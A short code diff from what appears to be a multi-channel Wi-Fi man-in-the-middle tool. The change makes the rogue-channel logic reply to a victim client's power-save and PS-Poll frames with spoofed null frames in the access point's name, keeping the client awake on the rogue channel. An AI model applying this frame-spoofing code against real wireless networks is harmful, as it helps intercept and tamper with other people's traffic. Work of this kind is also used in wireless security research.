@@ -84,16 +84,20 @@ void McMitm::handle_from_ap_real(const Dot11 &dot11, const HWAddress<6> &addr1, 
 }
 
 void McMitm::power_mgmt_response_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
-	if(dot11.addr1() == ap.get(SK::mac)){ // ->AP
+	if(dot11.addr1() == ap.get(SK::mac) && client_state.get_mac() == addr2){ // ->AP
 		// sleep mode detection for keep wake up
 		// encrypted, but still works for wake up
 		// TODO check WNM sleeep mode -> cant be spoofed like this
-		if(dot11.power_mgmt() && client_state.get_mac() == addr2){
+
+		const bool is_pwr_mgmt = dot11.power_mgmt(); // APSD (QoS)
+		const bool is_ps_poll = dot11.type() == Dot11::CONTROL && dot11.subtype() == Dot11::DOT11_PS_POLL;
+
+		if (is_pwr_mgmt || is_ps_poll) {
 			Dot11Data null_frame(ap.get(SK::mac), addr2);
 			null_frame.subtype(Dot11::DATA_NULL);
 			null_frame.addr3(ap.get(SK::mac));
 			send_to_real(null_frame);
-			display_traffic(dot11, "Rogue channel", " -- Replied");
+			display_traffic(dot11, "Rogue channel", " -- Replied to Sleep/Poll");
 		}
 	}
 }
